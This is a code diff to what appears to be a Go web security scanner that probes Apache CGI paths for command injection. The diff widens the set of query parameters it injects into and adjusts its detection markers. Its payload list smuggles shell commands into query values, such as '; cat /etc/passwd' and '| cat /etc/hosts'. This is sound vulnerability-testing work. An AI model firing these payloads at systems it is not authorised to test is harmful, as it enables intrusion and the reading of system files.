@@ -12,7 +12,7 @@ var commandInjectionPayloads = []string{
 	"; cat /etc/passwd",
 	"| cat /etc/hosts",
 	"&& ls -la",
-	"; echo 'vulnerable'",
+	"; echo 'RCE'",
 	"| echo 'RCE'",
 }
 
@@ -31,6 +31,22 @@ var commonModFilePaths = []string{
 	"/cgi-bin/printenv.cgi",
 }
 
+var queryParams = []string{
+	"action",   // frequently seen in forms and CGI
+	"mode",     // often used to toggle operations
+	"cmd",      // used in some admin/debug tools
+	"do",       // like ?do=login or ?do=edit
+	"option",   // generic control flag
+	"module",   // sometimes used in pluggable systems
+	"plugin",   // same as module
+	"function", // old PHP/Perl apps
+	"query",    // search/query handler
+	"search",   // common on older search pages
+	"type",     // selects file or action type
+	"lang",     // language, might be used for includes
+	"file",     // filename input
+}
+
 func PerformApachePathModFileInjection(ctx context.Context, config *methodwebtest.PathModFileConfig) *methodwebtest.Report {
 	generatedInjectionPayloads := generateModFileQueryInjectionParams(commandInjectionPayloads)
 
@@ -41,6 +57,7 @@ func PerformApachePathModFileInjection(ctx context.Context, config *methodwebtes
 		InjectedPayloads:  generatedInjectionPayloads,
 		InjectionLocation: methodwebtest.InjectionLocationQuery,
 		EventType:         methodwebtest.NewEventTypeFromMultiEvent(methodwebtest.MultiEventCommandecho),
+		FollowRedirects:   true,
 		Timeout:           config.Timeout,
 		Retries:           config.Retries,
 		Sleep:             config.Sleep,
@@ -54,8 +71,10 @@ func PerformApachePathModFileInjection(ctx context.Context, config *methodwebtes
 
 func generateModFileQueryInjectionParams(commandInjectionPayloads []string) []map[string]string {
 	payloads := []map[string]string{}
-	for _, payload := range commandInjectionPayloads {
-		payloads = append(payloads, map[string]string{"input": payload})
+	for _, queryParam := range queryParams {
+		for _, payload := range commandInjectionPayloads {
+			payloads = append(payloads, map[string]string{queryParam: payload})
+		}
 	}
 	return payloads
 }
@@ -63,11 +82,10 @@ func generateModFileQueryInjectionParams(commandInjectionPayloads []string) []ma
 func detectModFileRCE(report *methodwebtest.Report) {
 	// Deterministic detection function
 	indicators := []string{
-		"root:x",     // Common content in /etc/passwd
-		"127.0.0.1",  // Common content in /etc/hosts
-		"vulnerable", // Custom echo
-		"RCE",        // Custom echo
-		"total",      // Common output of ls -la
+		"root:x",    // Common content in /etc/passwd
+		"127.0.0.1", // Common content in /etc/hosts
+		"RCE",       // Custom echo
+		"total",     // Common output of ls -la
 	}
 	for _, target := range report.Targets {
 		if target.Attempts == nil {
